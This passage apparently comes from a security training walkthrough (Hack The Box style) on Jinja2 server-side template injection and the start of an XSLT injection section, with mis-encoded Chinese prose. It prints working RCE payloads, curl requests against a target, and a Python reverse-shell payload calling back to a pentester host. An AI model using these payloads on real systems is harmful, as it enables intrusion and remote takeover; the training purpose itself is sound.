&amp;#39;click.core.BaseCommand&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.core.Parameter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.signals.Namespace&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.signals._FakeSignal&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.cli.DispatchingApp&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.cli.ScriptInfo&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.config.ConfigAttribute&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.ctx._AppCtxGlobals&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.ctx.AppContext&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.ctx.RequestContext&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.scaffold.Scaffold&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itsdangerous._json._CompactJSON&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itsdangerous.signer.SigningAlgorithm&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itsdangerous.signer.Signer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itsdangerous.serializer.Serializer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.json.tag.JSONTag&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.json.tag.TaggedJSONSerializer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.sessions.SessionInterface&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.blueprints.BlueprintSetupState&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;unicodedata.UCD&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;__future__._Feature&amp;#39;&amp;gt;]&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;input type="submit" value="execute"&gt;</span><br><span class="line">			&lt;/form&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>è®©æˆ‘ä»¬ä½¿ç”¨ä¸‹é¢çš„æœ‰æ•ˆè´Ÿè½½æ‰“å°å‡ºæ•°å­—å’Œæ–¹æ³•åç§°ã€‚</p>
<p>Code: </p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">{% <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">450</span>) %} </span><br><span class="line">{{ i }}</span><br><span class="line">{{ <span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[i].__name__ }} </span><br><span class="line">{% endfor %}</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -gs "http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd=%7B%25%20for%20i%20in%20range%28450%29%20%25%7D%20%7B%7B%20i%20%7D%7D%20%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5Bi%5D.__name__%20%7D%7D%20%7B%25%20endfor%20%25%7D"</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div id="desktop"&gt;</span><br><span class="line">		&lt;div class="window" data-title="Run"&gt;</span><br><span class="line">			&lt;form action="/execute" method="get"&gt;</span><br><span class="line">				&lt;a&gt;C:\&gt;&lt;input type="text" name="cmd" id="command"&gt;&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;a&gt; 0 type  1 weakref  2 weakcallableproxy  3 weakproxy  4 int  5 bytearray  6 bytes  7 list  8 NoneType  9 NotImplementedType  10 traceback  11 super  12 range  13 dict  14 dict_keys  15 dict_values  16 dict_items  17 dict_reversekeyiterator  18 dict_reversevalueiterator  19 dict_reverseitemiterator  20 odict_iterator  21 set  22 str  23 slice  24 staticmethod  25 complex  26 float  27 frozenset  28 property  29 managedbuffer  30 memoryview  31 tuple  32 enumerate  33 reversed  34 stderrprinter  35 code  36 frame  37 builtin_function_or_method  38 method  39 function  40 mappingproxy  41 generator  42 getset_descriptor  43 wrapper_descriptor  44 method-wrapper  45 ellipsis  46 member_descriptor  47 SimpleNamespace  48 PyCapsule  49 longrange_iterator  50 cell  51 instancemethod  52 classmethod_descriptor  53 method_descriptor  54 callable_iterator  55 iterator  56 PickleBuffer  57 coroutine  58 coroutine_wrapper  59 InterpreterID  60 EncodingMap  61 fieldnameiterator  62 formatteriterator  63 BaseException  64 hamt  65 hamt_array_node  66 hamt_bitmap_node  67 hamt_collision_node  68 keys  69 values  70 items  71 Context  72 ContextVar  73 Token  74 MISSING  75 moduledef  76 module  77 filter  78 map  79 zip  80 _ModuleLock  81 _DummyModuleLock  82 _ModuleLockManager  83 ModuleSpec  84 BuiltinImporter  85 classmethod  86 FrozenImporter  87 _ImportLockContext  88 _localdummy  89 _local  90 lock  91 RLock  92 _IOBase  93 _BytesIOBuffer  94 IncrementalNewlineDecoder  95 ScandirIterator  96 DirEntry  97 WindowsRegistryFinder  98 _LoaderBasics  99 FileLoader  100 _NamespacePath  101 _NamespaceLoader  102 PathFinder  103 FileFinder  104 zipimporter  105 _ZipImportResourceReader  106 Codec  107 IncrementalEncoder  108 IncrementalDecoder  109 StreamReaderWriter  110 StreamRecoder  111 _abc_data  112 ABC  113 dict_itemiterator  114 Hashable  115 Awaitable  116 AsyncIterable  117 async_generator  118 Iterable  119 bytes_iterator  120 bytearray_iterator  121 dict_keyiterator  122 dict_valueiterator  123 list_iterator  124 list_reverseiterator  125 range_iterator  126 set_iterator  127 str_iterator  128 tuple_iterator  129 Sized  130 Container  131 Callable  132 _wrap_close  133 Quitter  134 _Printer  135 _Helper  136 itemgetter  137 attrgetter  138 methodcaller  139 accumulate  140 combinations  141 combinations_with_replacement  142 cycle  143 dropwhile  144 takewhile  145 islice  146 starmap  147 chain  148 compress  149 filterfalse  150 count  151 zip_longest  152 permutations  153 product  154 repeat  155 groupby  156 _grouper  157 _tee  158 _tee_dataobject  159 Repr  160 deque  161 _deque_iterator  162 _deque_reverse_iterator  163 _tuplegetter  164 _Link  165 partial  166 _lru_cache_wrapper  167 partialmethod  168 singledispatchmethod  169 cached_property  170 DynamicClassAttribute  171 _GeneratorWrapper  172 auto  173 Enum  174 Pattern  175 Match  176 SRE_Scanner  177 State  178 SubPattern  179 Tokenizer  180 Scanner  181 Template  182 Formatter  183 ContextDecorator  184 _GeneratorContextManagerBase  185 _BaseExitStack  186 _Final  187 _Immutable  188 Generic  189 _TypingEmpty  190 _TypingEllipsis  191 NamedTuple  192 typing.io  193 typing.re  194 AST  195 _MarkupEscapeHelper  196 poll  197 epoll  198 BaseSelector  199 socket  200 _IterationGuard  201 WeakSet  202 _RLock  203 Condition  204 Semaphore  205 Event  206 Barrier  207 Thread  208 BaseServer  209 ForkingMixIn  210 _NoThreads  211 ThreadingMixIn  212 BaseRequestHandler  213 WarningMessage  214 catch_warnings  215 date  216 timedelta  217 time  218 tzinfo  219 _Info  220 finalize  221 sha384  222 sha512  223 Random  224 _ResultMixinStr  225 _ResultMixinBytes  226 _NetlocResultMixinBase  227 _localized_month  228 _localized_day  229 Calendar  230 different_locale  231 AddrlistClass  232 Struct  233 unpack_iterator  234 Charset  235 Header  236 _ValueFormatter  237 _PolicyBase  238 BufferedSubFile  239 FeedParser  240 Parser  241 BytesParser  242 Message  243 HTTPConnection  244 _SSLContext  245 _SSLSocket  246 MemoryBIO  247 Session  248 SSLObject  249 MimeTypes  250 Compress  251 Decompress  252 BZ2Compressor  253 BZ2Decompressor  254 LZMACompressor  255 LZMADecompressor  256 Bytecode  257 Untokenizer  258 BlockFinder  259 _void  260 _empty  261 Parameter  262 BoundArguments  263 Signature  264 FrameSummary  265 TracebackException  266 LogRecord  267 PercentStyle  268 Formatter  269 BufferingFormatter  270 Filter  271 Filterer  272 PlaceHolder  273 Manager  274 LoggerAdapter  275 _Missing  276 Aborter  277 Href  278 CompletedProcess  279 Popen  280 HASH  281 blake2b  282 blake2s  283 sha3_224  284 sha3_256  285 sha3_384  286 sha3_512  287 shake_128  288 shake_256  289 _RandomNameSequence  290 _TemporaryFileCloser  291 _TemporaryFileWrapper  292 SpooledTemporaryFile  293 TemporaryDirectory  294 Request  295 OpenerDirector  296 BaseHandler  297 HTTPPasswordMgr  298 AbstractBasicAuthHandler  299 AbstractDigestAuthHandler  300 URLopener  301 ftpwrapper  302 Cookie  303 CookiePolicy  304 Absent  305 CookieJar  306 ImmutableListMixin  307 ImmutableDictMixin  308 _omd_bucket  309 Headers  310 ImmutableHeadersMixin  311 IfRange  312 Range  313 ContentRange  314 FileStorage  315 _HAS_DEFAULT_FACTORY_CLASS  316 _MISSING_TYPE  317 _FIELD_BASE  318 InitVar  319 Field  320 _DataclassParams  321 Event  322 MultipartDecoder  323 MultipartEncoder  324 Finder  325 Loader  326 ResourceReader  327 ImpImporter  328 ImpLoader  329 HMAC  330 ClosingIterator  331 FileWrapper  332 _RangeWrapper  333 HTMLBuilder  334 AcceptMixin  335 AuthorizationMixin  336 WWWAuthenticateMixin  337 Scanner  338 Encoder  339 JSONDecoder  340 JSONEncoder  341 FormDataParser  342 MultiPartParser  343 UserAgent  344 _UserAgentParser  345 Request  346 StreamOnlyMixin  347 Response  348 ResponseStream  349 ResponseStreamMixin  350 CommonRequestDescriptorsMixin  351 CommonResponseDescriptorsMixin  352 ETagRequestMixin  353 ETagResponseMixin  354 UserAgentMixin  355 _TestCookieHeaders  356 _TestCookieResponse  357 EnvironBuilder  358 Client  359 Decimal  360 Context  361 SignalDictMixin  362 ContextManager  363 Number  364 UUID  365 Unpickler  366 Pickler  367 Pdata  368 PicklerMemoProxy  369 UnpicklerMemoProxy  370 _Framer  371 _Unframer  372 _Pickler  373 _Unpickler  374 Bucket  375 BytecodeCache  376 MissingType  377 LRUCache  378 Cycler  379 Joiner  380 Namespace  381 EvalContext  382 Node  383 NodeVisitor  384 Symbols  385 MacroRef  386 Frame  387 TemplateReference  388 Context  389 BlockReference  390 LoopContext  391 Macro  392 Undefined  393 NodeVisitor  394 Failure  395 TokenStreamIterator  396 TokenStream  397 Lexer  398 Parser  399 Environment  400 Template  401 TemplateModule  402 TemplateExpression  403 TemplateStream  404 BaseLoader  405 Local  406 LocalStack  407 LocalManager  408 _ProxyLookup  409 LocalProxy  410 SequenceMatcher  411 Differ  412 HtmlDiff  413 _safe_key  414 PrettyPrinter  415 RuleFactory  416 RuleTemplate  417 BaseConverter  418 Map  419 MapAdapter  420 NullTranslations  421 _FixupStream  422 _AtomicFile  423 LazyFile  424 KeepOpenFile  425 PacifyFlushWrapper  426 ParamType  427 Option  428 Argument  429 ParsingState  430 OptionParser  431 HelpFormatter  432 Context  433 BaseCommand  434 Parameter  435 Namespace  436 _FakeSignal  437 DispatchingApp  438 ScriptInfo  439 ConfigAttribute  440 _AppCtxGlobals  441 AppContext  442 RequestContext  443 Scaffold  444 _CompactJSON  445 SigningAlgorithm  446 Signer  447 Serializer  448 JSONTag  449 TaggedJSONSerializer &lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;input type="submit" value="execute"&gt;</span><br><span class="line">			&lt;/form&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>æ­£å¦‚æ‚¨åœ¨åº”ç”¨ç¨‹åºçš„å“åº”ä¸­æ‰€çœ‹åˆ°çš„ï¼Œ<code>catch_warnings</code>ä½äºç´¢å¼•#214ã€‚</p>
<p>æˆ‘ä»¬æ‹¥æœ‰æ„å»ºRCEæœ‰æ•ˆè´Ÿè½½æ‰€éœ€çš„ä¸€åˆ‡ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚</p>
<p>Code: </p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">{{<span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">214</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">"touch /tmp/test1"</span>) }}  </span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -gs "http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B214%5D%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.system%28%22touch%20%2Ftmp%2Ftest1%22%29%20%7D%7D"</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div id="desktop"&gt;</span><br><span class="line">		&lt;div class="window" data-title="Run"&gt;</span><br><span class="line">			&lt;form action="/execute" method="get"&gt;</span><br><span class="line">				&lt;a&gt;C:\&gt;&lt;input type="text" name="cmd" id="command"&gt;&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;a&gt;0&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;input type="submit" value="execute"&gt;</span><br><span class="line">			&lt;/form&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>åº”ç”¨ç¨‹åºåœ¨å“åº”ä¸­è¿”å›<code>0</code>ã€‚è¿™æ˜¯æˆ‘ä»¬åˆšåˆšæ‰§è¡Œçš„å‘½ä»¤çš„è¿”å›å€¼ã€‚<code>0</code>è¡¨ç¤ºå‘½ä»¤æ‰§è¡Œæ— è¯¯ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥ç¡®å®š<code>test1</code>æ˜¯å¦æ˜¯ä½¿ç”¨ä»¥ä¸‹æœ‰æ•ˆè´Ÿè½½åˆ›å»ºçš„ã€‚</p>
<p>Code: </p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">{{<span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">214</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">'os'</span>).popen(<span class="string">'ls /tmp'</span>).read()}}     </span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -gs "http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B214%5D%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28%27ls%20%2Ftmp%27%29.read%28%29%7D%7D"</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div id="desktop"&gt;</span><br><span class="line">		&lt;div class="window" data-title="Run"&gt;</span><br><span class="line">			&lt;form action="/execute" method="get"&gt;</span><br><span class="line">				&lt;a&gt;C:\&gt;&lt;input type="text" name="cmd" id="command"&gt;&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;a&gt;test1</span><br><span class="line">tmpv4tucw2b</span><br><span class="line">&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;input type="submit" value="execute"&gt;</span><br><span class="line">			&lt;/form&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>ç°åœ¨æˆ‘ä»¬å·²ç»å®Œæˆäº†æœ‰æ•ˆè´Ÿè½½çš„å¼€å‘è¿‡ç¨‹ï¼Œå€¼å¾—ä¸€æçš„æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€äº›ç‰¹å®šçš„åŠŸèƒ½æ¥ä¿ƒè¿›å¯¹Jinja2 SSTIæ¼æ´çš„åˆ©ç”¨ã€‚è¿™æ˜¯<code>request</code>å’Œ<code>lipsum</code>ã€‚è¯·éšæ„å°†å®ƒä»¬æäº¤ç»™æœ¬èŠ‚çš„ç›®æ ‡ã€‚</p>
<p>Code: </p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">{{request.application.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">'os'</span>).popen(<span class="string">'id'</span>).read()}}</span><br></pre></td></tr></tbody></table></figure>

<p>Code: </p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">{{lipsum.__globals__.os.popen(<span class="string">'id'</span>).read()}}</span><br></pre></td></tr></tbody></table></figure>

<p>åå‘å¤–å£³ä¹Ÿå¯ä»¥é€šè¿‡å¦‚ä¸‹æœ‰æ•ˆè½½è·å»ºç«‹ã€‚</p>
<p>Code: </p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">{{<span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">214</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">'os'</span>).popen(<span class="string">'python -c \'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;PENTESTER_IP&gt;",&lt;PENTESTER_PORT&gt;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''</span>).read()}}</span><br></pre></td></tr></tbody></table></figure>

<h1 id="Attacking-XSLT"><a href="#Attacking-XSLT" class="headerlink" title="Attacking XSLT"></a>Attacking XSLT</h1><p>å¯æ‰©å±•æ ·å¼è¡¨è¯­è¨€è½¬æ¢ï¼ˆ<code>XSLT</code>ï¼‰æ˜¯ä¸€ç§åŸºäºXMLçš„è¯­è¨€ï¼Œé€šå¸¸ç”¨äºå°†XMLæ–‡æ¡£è½¬æ¢ä¸ºHTMLã€å¦ä¸€ä¸ªXMLæ–‡æ¡£æˆ–PDFã€‚å¯æ‰©å±•æ ·å¼è¡¨è¯­è¨€è½¬æ¢æœåŠ¡å™¨ç«¯æ³¨å…¥å¯èƒ½å‘ç”Ÿåœ¨å¯ä»¥ä¸Šè½½ä»»æ„XSLæ–‡ä»¶æˆ–åº”ç”¨ç¨‹åºä½¿ç”¨æ¥è‡ªç”¨æˆ·çš„æœªç»éªŒè¯çš„è¾“å…¥åŠ¨æ€ç”ŸæˆXSLè½¬æ¢çš„XMLæ–‡æ¡£æ—¶ã€‚</p>
<p>æ ¹æ®å…·ä½“æƒ…å†µï¼ŒNetBeansä½¿ç”¨å†…ç½®å‡½æ•°å’ŒXPATHè¯­è¨€åœ¨æµè§ˆå™¨æˆ–æœåŠ¡å™¨ä¸­è½¬æ¢æ–‡æ¡£ã€‚å¯æ‰©å±•æ ·å¼è¡¨è¯­è¨€è½¬æ¢åœ¨ä¸€äº›Webåº”ç”¨ç¨‹åºä¸­ä½œä¸ºç‹¬ç«‹åŠŸèƒ½ï¼ŒSSIå¼•æ“å’ŒOracleç­‰æ•°æ®åº“å­˜åœ¨ã€‚åœ¨æ’°å†™æœ¬æ–‡æ—¶ï¼Œæœ‰3ä¸ªï¼ˆ<a target="_blank" rel="noopener" href="https://www.w3.org/TR/xslt-10/">1</a>ï¼Œ<a target="_blank" rel="noopener" href="https://www.w3.org/TR/xslt20/">2</a>ï¼Œ<a target="_blank" rel="noopener" href="https://www.w3.org/TR/xslt-30/">3</a>ï¼‰ç‰ˆæœ¬ã€‚ä»æ”»å‡»è€…çš„è§’åº¦æ¥çœ‹ï¼Œç‰ˆæœ¬1æ˜¯æœ€ä¸æ„Ÿå…´è¶£çš„ï¼Œå› ä¸ºå®ƒçš„å†…ç½®åŠŸèƒ½æœ‰é™ã€‚ä½¿ç”¨æœ€å¤šçš„XSLTç›¸å…³é¡¹ç›®æ˜¯Libertyã€Xalanå’ŒSaxonã€‚ä¸ºäº†åˆ©ç”¨æ¶æ„æ³¨å…¥ï¼Œæˆ‘ä»¬éœ€è¦åœ¨æœåŠ¡å™¨ç«¯å­˜å‚¨æ¶æ„æ ‡ç­¾å¹¶è®¿é—®è¯¥å†…å®¹ã€‚</p>
<p>è®©æˆ‘ä»¬é€šè¿‡ç»“åˆä½¿ç”¨Saxonå’ŒJavaScript Version 2æ¥è¯•éªŒJavaScriptã€‚</p>
<p>é¦–å…ˆï¼Œåœ¨Pwnboxæˆ–æœ¬åœ°VMä¸Šå®‰è£…æ‰€éœ€çš„è½¯ä»¶åŒ…ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<h4 id="Installation-of-required-packages"><a href="#Installation-of-required-packages" class="headerlink" title="Installation of required packages"></a>Installation of required packages</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ sudo apt install default-jdk libsaxon-java libsaxonb-java</span><br></pre></td></tr></tbody></table></figure>

<p>æ¥ä¸‹æ¥ï¼Œåˆ›å»ºä»¥ä¸‹æ–‡ä»¶ï¼š</p>
<h4 id="catalogue-xml"><a href="#catalogue-xml" class="headerlink" title="catalogue.xml"></a>catalogue.xml</h4><p>Code: </p>
<figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">catalog</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Empire Burlesque<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Bob Dylan<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>USA<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Columbia<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>10.90<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1985<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hide your heart<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Bonnie Tyler<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>CBS Records<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>9.90<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1988<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Greatest Hits<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Dolly Parton<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>USA<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>RCA<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>9.90<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1982<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Still got the blues<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Gary Moore<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Virgin records<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>10.20<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1990<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Eros<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Eros Ramazzotti<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>EU<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>BMG<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>9.90<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1997<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>One night only<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Bee Gees<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Polydor<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>10.90<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1998<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Sylvias Mother<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Dr.Hook<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>CBS<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>8.10<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1973<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Maggie May<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Rod Stewart<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Pickwick<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>8.50<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1990<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span 